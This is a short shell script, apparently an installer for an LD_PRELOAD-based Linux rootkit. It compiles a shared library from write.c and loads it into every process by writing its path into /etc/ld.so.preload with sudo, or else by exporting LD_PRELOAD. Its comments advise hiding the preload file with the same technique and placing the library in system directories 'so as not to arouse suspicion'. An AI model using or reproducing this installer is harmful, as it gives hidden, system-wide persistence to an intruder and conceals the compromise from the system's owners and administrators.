#!/usr/bin/env sh

# Compiling
gcc -ldl write.c -fPIC -shared -D_GNU_SOURCE -o write.so
if [ $? -ne 0 ]; then
	gcc write.c -fPIC -shared -D_GNU_SOURCE -o write.so -ldl
fi
# Pre-loading methods
sudo sh -c "echo $(pwd)/write.so > /etc/ld.so.preload"
if [ $? -ne 0 ]; then
	export LD_PRELOAD=$(pwd)/write.so
fi
# You know that if both are specified, then the libraries
# specified by LD_PRELOAD are loaded first. Both the methods
# have their pros and cons depending on the situation, but
# I personally prefer the latter because we can easily hide
# the /etc/ld.so.preload file using this very same method
# and not the dot-before-filename way.

# Note: Both of these commands must be run from the directory
# containing the shared object file. Ideally, you would want to
# store them somewhere like /lib or /usr/lib depending on where
# your system stores the shared library object files so as not
# to arouse suspicion.
